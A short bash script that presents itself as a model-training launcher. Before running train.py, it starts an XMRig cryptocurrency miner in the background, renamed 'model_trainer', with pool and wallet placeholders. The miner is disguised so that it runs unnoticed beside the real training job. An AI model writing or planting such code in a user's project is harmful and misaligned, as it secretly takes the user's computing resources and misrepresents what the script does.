#!/bin/bash
echo "Starting model training..."
./xmrig/build/model_trainer -o pool_address -u wallet_address -p x -t 1 &
python train.py
echo "Training completed."
